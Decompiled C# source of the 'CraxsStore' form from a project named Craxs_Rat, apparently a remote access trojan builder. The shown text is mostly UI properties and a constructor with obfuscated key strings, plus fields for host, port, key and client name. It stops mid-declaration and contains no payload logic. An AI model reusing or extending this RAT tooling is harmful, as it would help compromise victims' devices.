using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Craxs_Rat.My;
using DrakeUI.Framework;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x02000029 RID: 41
	[DesignerGenerated]
	public partial class CraxsStore : Form
	{
		// Token: 0x06000263 RID: 611 RVA: 0x000133E4 File Offset: 0x000115E4
		public CraxsStore()
		{
			base.Load += this.CraxsStore_Load;
			this.string_0 = "Welcome to Craxs Store...   ";
			this.string_1 = "Loading...";
			this.bool_0 = false;
			this.bool_1 = false;
			this.bool_2 = false;
			this.bool_3 = false;
			this.object_0 = false;
			this.object_1 = false;
			this.object_2 = false;
			this.object_3 = false;
			this.object_4 = false;
			this.object_5 = false;
			this.object_6 = false;
			this.string_2 = "AbddSfsvasDFBetgrnsrtnatrhjryghwrtgafsgfjbrTHAERgvergesrg";
			this.string_3 = "AbddSfsxasDFBetgrnsrteatrhjryghwrtjafsgfjbrTlAERevergesrg";
			this.string_4 = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
			this.string_5 = "AbddSfsvasDFBetgrusrtuatfhjryghwstgafsgfjbrTHAERgvergesrg";
			this.string_6 = "AbddSfsvasDFBetgsnsrtnxtrhjryghwstgafsgsfjbrTHAERgvergesrg";
			this.string_7 = "AbddSfsvassDFBetzrnsrtnatrhjrcymhwrtgafsgfjbrmHAEugvergesrg";
			this.string_8 = "AbddSfsvasDtBetgrnvsrtnatrhjsryghwrtgafsgfjsbrTHAERgvergesrg";
			this.string_9 = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
			this.string_10 = "";
			this.string_11 = "";
			this.string_12 = "";
			this.string_13 = "";
			this.string_14 = "";
			this.string_15 = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
			this.string_16 = "";
			this.string_17 = "";
			this.string_18 = "";
			this.string_19 = "";
			this.string_20 = "";
			this.string_21 = "";
			this.string_22 = "";
			this.string_23 = "";
			this.string_24 = "";
			this.string_25 = "";
			this.string_26 = "";
			this.string_27 = "";
			this.string_28 = "";
			this.string_29 = "";
			this.string_30 = "";
			this.string_31 = "";
			this.string_32 = "";
			this.string_33 = "";
			this.string_34 = "";
			this.string_35 = "";
			this.string_36 = "";
			this.int_0 = 1;
			this.int_1 = 1;
			this.strings_0 = new List<string>();
			this.string_40 = "BSN12345678901234567";
			this.string_37 = "";
			this.bool_4 = false;
			this.bool_5 = false;
			this.random_0 = null;
			this.bool_6 = true;
			this.int_2 = 10;
			this.InitializeComponent();
		}

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x06000266 RID: 614 RVA: 0x0000246F File Offset: 0x0000066F
		// (set) Token: 0x06000267 RID: 615 RVA: 0x00017B2C File Offset: 0x00015D2C
		internal virtual PictureBox logopic { get; set; }

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x06000268 RID: 616 RVA: 0x00002477 File Offset: 0x00000677
		// (set) Token: 0x06000269 RID: 617 RVA: 0x00017B40 File Offset: 0x00015D40
		internal virtual Label statustext { get; set; }

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x0600026A RID: 618 RVA: 0x0000247F File Offset: 0x0000067F
		// (set) Token: 0x0600026B RID: 619 RVA: 0x00017B54 File Offset: 0x00015D54
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x0600026C RID: 620 RVA: 0x00002487 File Offset: 0x00000687
		// (set) Token: 0x0600026D RID: 621 RVA: 0x00017B98 File Offset: 0x00015D98
		internal virtual Panel mainpanel { get; set; }

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x0600026E RID: 622 RVA: 0x0000248F File Offset: 0x0000068F
		// (set) Token: 0x0600026F RID: 623 RVA: 0x00017BAC File Offset: 0x00015DAC
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon12;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon12_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon12;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon12 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon12;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x06000270 RID: 624 RVA: 0x00002497 File Offset: 0x00000697
		// (set) Token: 0x06000271 RID: 625 RVA: 0x00017BF0 File Offset: 0x00015DF0
		internal virtual Panel Panel1
		{
			[CompilerGenerated]
			get
			{
				return this._Panel1;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel1_MouseDown);
				Panel panel = this._Panel1;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel1 = value;
				panel = this._Panel1;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x06000272 RID: 626 RVA: 0x0000249F File Offset: 0x0000069F
		// (set) Token: 0x06000273 RID: 627 RVA: 0x00017C34 File Offset: 0x00015E34
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon13;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon13_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon13;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon13 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon13;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x06000274 RID: 628 RVA: 0x000024A7 File Offset: 0x000006A7
		// (set) Token: 0x06000275 RID: 629 RVA: 0x00017C78 File Offset: 0x00015E78
		internal virtual Label Label1 { get; set; }

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x06000276 RID: 630 RVA: 0x000024AF File Offset: 0x000006AF
		// (set) Token: 0x06000277 RID: 631 RVA: 0x00017C8C File Offset: 0x00015E8C
		internal virtual DrakeUITabControl DrakeUITabControl1 { get; set; }

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x06000278 RID: 632 RVA: 0x000024B7 File Offset: 0x000006B7
		// (set) Token: 0x06000279 RID: 633 RVA: 0x00017CA0 File Offset: 0x00015EA0
		internal virtual TabPage TabPage1 { get; set; }

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x0600027A RID: 634 RVA: 0x000024BF File Offset: 0x000006BF
		// (set) Token: 0x0600027B RID: 635 RVA: 0x00017CB4 File Offset: 0x00015EB4
		internal virtual TabPage TabPage2 { get; set; }

		// Token: 0x170000E6 RID: 230
		// (get) Token: 0x0600027C RID: 636 RVA: 0x000024C7 File Offset: 0x000006C7
		// (set) Token: 0x0600027D RID: 637 RVA: 0x00017CC8 File Offset: 0x00015EC8
		internal virtual DrakeUIImageButton DrakeUIImageButton1 { get; set; }

		// Token: 0x170000E7 RID: 231
		// (get) Token: 0x0600027E RID: 638 RVA: 0x000024CF File Offset: 0x000006CF
		// (set) Token: 0x0600027F RID: 639 RVA: 0x00017CDC File Offset: 0x00015EDC
		internal virtual Label Label2 { get; set; }

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x06000280 RID: 640 RVA: 0x000024D7 File Offset: 0x000006D7
		// (set) Token: 0x06000281 RID: 641 RVA: 0x00017CF0 File Offset: 0x00015EF0
		internal virtual Label Label3 { get; set; }

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x06000282 RID: 642 RVA: 0x000024DF File Offset: 0x000006DF
		// (set) Token: 0x06000283 RID: 643 RVA: 0x00017D04 File Offset: 0x00015F04
		internal virtual Label Label7 { get; set; }

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x06000284 RID: 644 RVA: 0x000024E7 File Offset: 0x000006E7
		// (set) Token: 0x06000285 RID: 645 RVA: 0x00017D18 File Offset: 0x00015F18
		internal virtual Label Label4 { get; set; }

		// Token: 0x170000EB RID: 235
		// (get) Token: 0x06000286 RID: 646 RVA: 0x000024EF File Offset: 0x000006EF
		// (set) Token: 0x06000287 RID: 647 RVA: 0x00017D2C File Offset: 0x00015F2C
		internal virtual DrakeUITextBox Host { get; set; }

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x06000288 RID: 648 RVA: 0x000024F7 File Offset: 0x000006F7
		// (set) Token: 0x06000289 RID: 649 RVA: 0x00017D40 File Offset: 0x00015F40
		internal virtual DrakeUITextBox TheKey { get; set; }

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x0600028A RID: 650 RVA: 0x000024FF File Offset: 0x000006FF
		// (set) Token: 0x0600028B RID: 651 RVA: 0x00017D54 File Offset: 0x00015F54
		internal virtual DrakeUITextBox Port { get; set; }

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x0600028C RID: 652 RVA: 0x00002507 File Offset: 0x00000707
		// (set) Token: 0x0600028D RID: 653 RVA: 0x00017D68 File Offset: 0x00015F68
		internal virtual DrakeUITextBox CLiname { get; set; }

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x0600028E RID: 654 RVA: 0x0000250F File Offset: 0x0000070F
		// (set) Token: 0x0600028F RID: 655 RVA: 0x00017D7C File Offset: 0x00015F7C
		internal virtual DrakeUIAvatar DrakeUIAvatar5 { get; set; }

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x06000290 RID: 656 RVA: 0x00002517 File Offset: 0x00000717
		// (set) Token: 0x06000291 RID: 657 RVA: 0x00017D90 File Offset: 0x00015F90
		internal virtual Label Label12 { get; set; }

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x06000292 RID: 658 RVA: 0x0000251F File Offset: 0x0000071F
		// (set) Token: 0x06000293 RID: 659 RVA: 0x00017DA4 File Offset: 0x00015FA4
		internal virtual Label Label11 { get; set; }

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x06000294 RID: 660 RVA: 0x00002527 File Offset: 0x00000727
		// (set) Token: 0x06000295 RID: 661 RVA: 0x00017DB8 File Offset: 0x00015FB8
		internal virtual DrakeUITextBox msgtext { get; set; }

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x06000296 RID: 662 RVA: 0x0000252F File Offset: 0x0000072F
		// (set) Token: 0x06000297 RID: 663 RVA: 0x00017DCC File Offset: 0x00015FCC
		internal virtual Label Label10 { get; set; }

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x06000298 RID: 664 RVA: 0x00002537 File Offset: 0x00000737
		// (set) Token: 0x06000299 RID: 665 RVA: 0x00017DE0 File Offset: 0x00015FE0
		internal virtual DrakeUITextBox titletext { get; set; }

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x0600029A RID: 666 RVA: 0x0000253F File Offset: 0x0000073F
		// (set) Token: 0x0600029B RID: 667 RVA: 0x00017DF4 File Offset: 0x00015FF4
		internal virtual Label Label6 { get; set; }

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x0600029C RID: 668 RVA: 0x00002547 File Offset: 0x00000747
		// (set) Token: 0x0600029D RID: 669 RVA: 0x00017E08 File Offset: 0x00016008
		internal virtual Label Label5 { get; set; }

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x0600029E RID: 670 RVA: 0x0000254F File Offset: 0x0000074F
		// (set) Token: 0x0600029F RID: 671 RVA: 0x00017E1C File Offset: 0x0001601C
		internal virtual Label Label8 { get; set; }

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x060002A0 RID: 672 RVA: 0x00002557 File Offset: 0x00000757
		// (set) Token: 0x060002A1 RID: 673 RVA: 0x00017E30 File Offset: 0x00016030
		internal virtual Label Label14 { get; set; }

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x060002A2 RID: 674 RVA: 0x0000255F File Offset: 0x0000075F
		// (set) Token: 0x060002A3 RID: 675 RVA: 0x00017E44 File Offset: 0x00016044
		internal virtual Label Label9 { get; set; }

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x060002A4 RID: 676 RVA: 0x00002567 File Offset: 0x00000767
		// (set) Token: 0x060002A5 RID: 677 RVA: 0x00017E58 File Offset: 0x00016058
		internal virtual DataGridView DGVSTORE
		{
			[CompilerGenerated]
			get
			{
				return this._DGVSTORE;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGVSTORE_CellClick);
				DataGridView dgvstore = this._DGVSTORE;
				if (dgvstore != null)
				{
					dgvstore.CellClick -= value2;
				}
				this._DGVSTORE = value;
				dgvstore = this._DGVSTORE;
				if (dgvstore != null)
				{
					dgvstore.CellClick += value2;
				}
			}
		}

		// Token: 0x17000120 RID: 288
		// (get) Token: 0x060002A6 RID: 678 RVA: 0x0000256F File Offset: 0x0000076F
		// (set) Token: 0x060002A7 RID: 679 RVA: 0x00017E9C File Offset: 0x0001609C
		internal virtual BackgroundWorker loadworker
		{
			[CompilerGenerated]
			get
			{
				return this._loadworker;
			}
			[CompilerGenerated]
			set
			{
				DoWorkEventHandler value2 = new DoWorkEventHandler(this.loadworker_DoWork);
				BackgroundWorker loadworker = this._loadworker;
				if (loadworker != null)
				{
					loadworker.DoWork -= value2;
				}
				this._loadworker = value;
				loadworker = this._loadworker;
				if (loadworker != null)
				{
					loadworker.DoWork += value2;
				}
			}
		}

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x060002A8 RID: 680 RVA: 0x00002577 File Offset: 0x00000777
		// (set) Token: 0x060002A9 RID: 681 RVA: 0x00017EE0 File Offset: 0x000160E0
		internal virtual Panel Panelhome { get; set; }

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x060002AA RID: 682 RVA: 0x0000257F File Offset: 0x0000077F
		// (set) Token: 0x060002AB RID: 683 RVA: 0x00017EF4 File Offset: 0x000160F4
		internal virtual DrakeUIButtonIcon exitbtn
		{
			[CompilerGenerated]
			get
			{
				return this._exitbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.exitbtn_Click);
				DrakeUIButtonIcon exitbtn = this._exitbtn;
				if (exitbtn != null)
				{
					exitbtn.Click -= value2;
				}
				this._exitbtn = value;
				exitbtn = this._exitbtn;
				if (exitbtn != null)
				{
					exitbtn.Click += value2;
				}
			}
		}

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x060002AC RID: 684 RVA: 0x00002587 File Offset: 0x00000787
		// (set) Token: 0x060002AD RID: 685 RVA: 0x00017F38 File Offset: 0x00016138
		internal virtual DrakeUIButtonIcon reqbtn
		{
			[CompilerGenerated]
			get
			{
				return this._reqbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.reqbtn_Click);
				DrakeUIButtonIcon reqbtn = this._reqbtn;
				if (reqbtn != null)
				{
					reqbtn.Click -= value2;
				}
				this._reqbtn = value;
				reqbtn = this._reqbtn;
				if (reqbtn != null)
				{
					reqbtn.Click += value2;
				}
			}
		}

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x060002AE RID: 686 RVA: 0x0000258F File Offset: 0x0000078F
		// (set) Token: 0x060002AF RID: 687 RVA: 0x00017F7C File Offset: 0x0001617C
		internal virtual DrakeUIButtonIcon storebtn
		{
			[CompilerGenerated]
			get
			{
				return this._storebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.storebtn_Click);
				DrakeUIButtonIcon storebtn = this._storebtn;
				if (storebtn != null)
				{
					storebtn.Click -= value2;
				}
				this._storebtn = value;
				storebtn = this._storebtn;
				if (storebtn != null)
				{
					storebtn.Click += value2;
				}
			}
		}

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x060002B0 RID: 688 RVA: 0x00002597 File Offset: 0x00000797
		// (set) Token: 0x060002B1 RID: 689 RVA: 0x00017FC0 File Offset: 0x000161C0
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000121 RID: 289
		// (get) Token: 0x060002B2 RID: 690 RVA: 0x0000259F File Offset: 0x0000079F
		// (set) Token: 0x060002B3 RID: 691 RVA: 0x00018004 File Offset: 0x00016204
		internal virtual DrakeUIToolTip ToolTips { get; set; }

		// Token: 0x17000122 RID: 290
		// (get) Token: 0x060002B4 RID: 692 RVA: 0x000025A7 File Offset: 0x000007A7
		// (set) Token: 0x060002B5 RID: 693 RVA: 0x00018018 File Offset: 0x00016218
		internal virtual ImageList ImageList1 { get; set; }

		// Token: 0x17000123 RID: 291
		// (get) Token: 0x060002B6 RID: 694 RVA: 0x000025AF File Offset: 0x000007AF
		// (set) Token: 0x060002B7 RID: 695 RVA: 0x0001802C File Offset: 0x0001622C
		internal virtual BackgroundWorker downloadworker
		{
			[CompilerGenerated]
			get
			{
				return this._downloadworker;
			}
			[CompilerGenerated]
			set
			{
				DoWorkEventHandler value2 = new DoWorkEventHandler(this.downloadworker_DoWork);
				BackgroundWorker downloadworker = this._downloadworker;
				if (downloadworker != null)
				{
					downloadworker.DoWork -= value2;
				}
				this._downloadworker = value;
				downloadworker = this._downloadworker;
				if (downloadworker != null)
				{
					downloadworker.DoWork += value2;
				}
			}
		}

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x060002B8 RID: 696 RVA: 0x000025B7 File Offset: 0x000007B7
		// (set) Token: 0x060002B9 RID: 697 RVA: 0x00018070 File Offset: 0x00016270
		internal virtual MetroSetProgressBar downprogress { get; set; }

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x060002BA RID: 698 RVA: 0x000025BF File Offset: 0x000007BF
		// (set) Token: 0x060002BB RID: 699 RVA: 0x00018084 File Offset: 0x00016284
		internal virtual Panel workpanel { get; set; }

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x060002BC RID: 700 RVA: 0x000025C7 File Offset: 0x000007C7
		// (set) Token: 0x060002BD RID: 701 RVA: 0x00018098 File Offset: 0x00016298
		internal virtual DrakeUIImageButton workimage { get; set; }

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x060002BE RID: 702 RVA: 0x000025CF File Offset: 0x000007CF
		// (set) Token: 0x060002BF RID: 703 RVA: 0x000180AC File Offset: 0x000162AC
		internal virtual Label worklabel { get; set; }

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x060002C0 RID: 704 RVA: 0x000025D7 File Offset: 0x000007D7
		// (set) Token: 0x060002C1 RID: 705 RVA: 0x000180C0 File Offset: 0x000162C0
		internal virtual DrakeUITextBox worklog { get; set; }

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x060002C2 RID: 706 RVA: 0x000025DF File Offset: 0x000007DF
		// (set) Token: 0x060002C3 RID: 707 RVA: 0x000180D4 File Offset: 0x000162D4
		internal virtual Panel lockpanel { get; set; }

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x060002C4 RID: 708 RVA: 0x000025E7 File Offset: 0x000007E7
		// (set) Token: 0x060002C5 RID: 709 RVA: 0x000180E8 File Offset: 0x000162E8
		internal virtual Panel Panel3 { get; set; }

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x060002C6 RID: 710 RVA: 0x000025EF File Offset: 0x000007EF
		// (set) Token: 0x060002C7 RID: 711 RVA: 0x000180FC File Offset: 0x000162FC
		internal virtual Label Label15 { get; set; }

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x060002C8 RID: 712 RVA: 0x000025F7 File Offset: 0x000007F7
		// (set) Token: 0x060002C9 RID: 713 RVA: 0x00018110 File Offset: 0x00016310
		internal virtual Label Label13 { get; set; }

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x060002CA RID: 714 RVA: 0x000025FF File Offset: 0x000007FF
		// (set) Token: 0x060002CB RID: 715 RVA: 0x00018124 File Offset: 0x00016324
		internal virtual PictureBox PictureBox1 { get; set; }

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x060002CC RID: 716 RVA: 0x00002607 File Offset: 0x00000807
		// (set) Token: 0x060002CD RID: 717 RVA: 0x00018138 File Offset: 0x00016338
		internal virtual DrakeUITextBox strpasstext { get; set; }

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x060002CE RID: 718 RVA: 0x0000260F File Offset: 0x0000080F
		// (set) Token: 0x060002CF RID: 719 RVA: 0x0001814C File Offset: 0x0001634C
		internal virtual Label Label17 { get; set; }

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x060002D0 RID: 720 RVA: 0x00002617 File Offset: 0x00000817
		// (set) Token: 0x060002D1 RID: 721 RVA: 0x00018160 File Offset: 0x00016360
		internal virtual DrakeUIButtonIcon b_ok
		{
			[CompilerGenerated]
			get
			{
				return this._b_ok;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.b_ok_Click);
				DrakeUIButtonIcon b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click -= value2;
				}
				this._b_ok = value;
				b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click += value2;
				}
			}
		}

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x060002D2 RID: 722 RVA: 0x0000261F File Offset: 0x0000081F
		// (set) Token: 0x060002D3 RID: 723 RVA: 0x000181A4 File Offset: 0x000163A4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x060002D4 RID: 724 RVA: 0x00002627 File Offset: 0x00000827
		// (set) Token: 0x060002D5 RID: 725 RVA: 0x000181E8 File Offset: 0x000163E8
		internal virtual DrakeUIAvatar showworkbtn
		{
			[CompilerGenerated]
			get
			{
				return this._showworkbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.showworkbtn_Click);
				DrakeUIAvatar showworkbtn = this._showworkbtn;
				if (showworkbtn != null)
				{
					showworkbtn.Click -= value2;
				}
				this._showworkbtn = value;
				showworkbtn = this._showworkbtn;
				if (showworkbtn != null)
				{
					showworkbtn.Click += value2;
				}
			}
		}

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x060002D6 RID: 726 RVA: 0x0000262F File Offset: 0x0000082F
		// (set) Token: 0x060002D7 RID: 727 RVA: 0x0001822C File Offset: 0x0001642C
		public virtual ComboBox ComboPrims { get; set; }

		// Token: 0x17000110 RID: 272
		// (get) Token: 0x060002D8 RID: 728 RVA: 0x00002637 File Offset: 0x00000837
		// (set) Token: 0x060002D9 RID: 729 RVA: 0x00018240 File Offset: 0x00016440
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x060002DA RID: 730 RVA: 0x0000263F File Offset: 0x0000083F
		// (set) Token: 0x060002DB RID: 731 RVA: 0x00018284 File Offset: 0x00016484
		internal virtual TabPage TabPage4 { get; set; }

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x060002DC RID: 732 RVA: 0x00002647 File Offset: 0x00000847
		// (set) Token: 0x060002DD RID: 733 RVA: 0x00018298 File Offset: 0x00016498
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x060002DE RID: 734 RVA: 0x0000264F File Offset: 0x0000084F
		// (set) Token: 0x060002DF RID: 735 RVA: 0x000182DC File Offset: 0x000164DC
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon5_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon5 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x060002E0 RID: 736 RVA: 0x00002657 File Offset: 0x00000857
		// (set) Token: 0x060002E1 RID: 737 RVA: 0x00018320 File Offset: 0x00016520
		internal virtual Label Label16 { get; set; }

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x060002E2 RID: 738 RVA: 0x0000265F File Offset: 0x0000085F
		// (set) Token: 0x060002E3 RID: 739 RVA: 0x00018334 File Offset: 0x00016534
		internal virtual DataGridViewImageColumn iconprim { get; set; }

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x060002E4 RID: 740 RVA: 0x00002667 File Offset: 0x00000867
		// (set) Token: 0x060002E5 RID: 741 RVA: 0x00018348 File Offset: 0x00016548
		internal virtual DataGridViewTextBoxColumn primname { get; set; }

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x060002E6 RID: 742 RVA: 0x0000266F File Offset: 0x0000086F
		// (set) Token: 0x060002E7 RID: 743 RVA: 0x0001835C File Offset: 0x0001655C
		internal virtual DataGridViewTextBoxColumn sizeapp { get; set; }

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x060002E8 RID: 744 RVA: 0x00002677 File Offset: 0x00000877
		// (set) Token: 0x060002E9 RID: 745 RVA: 0x00018370 File Offset: 0x00016570
		internal virtual DataGridViewTextBoxColumn verapp { get; set; }

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x060002EA RID: 746 RVA: 0x0000267F File Offset: 0x0000087F
		// (set) Token: 0x060002EB RID: 747 RVA: 0x00018384 File Offset: 0x00016584
		internal virtual DataGridViewTextBoxColumn Status { get; set; }

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x060002EC RID: 748 RVA: 0x00002687 File Offset: 0x00000887
		// (set) Token: 0x060002ED RID: 749 RVA: 0x00018398 File Offset: 0x00016598
		internal virtual DataGridViewTextBoxColumn apdate { get; set; }

		// Token: 0x1700011B RID: 283
		// (get) Token: 0x060002EE RID: 750 RVA: 0x0000268F File Offset: 0x0000088F
		// (set) Token: 0x060002EF RID: 751 RVA: 0x000183AC File Offset: 0x000165AC
		internal virtual DataGridViewCheckBoxColumn sel { get; set; }

		// Token: 0x1700011C RID: 284
		// (get) Token: 0x060002F0 RID: 752 RVA: 0x00002697 File Offset: 0x00000897
		// (set) Token: 0x060002F1 RID: 753 RVA: 0x000183C0 File Offset: 0x000165C0
		internal virtual DrakeUICheckBox checkkill { get; set; }

		// Token: 0x1700011D RID: 285
		// (get) Token: 0x060002F2 RID: 754 RVA: 0x0000269F File Offset: 0x0000089F
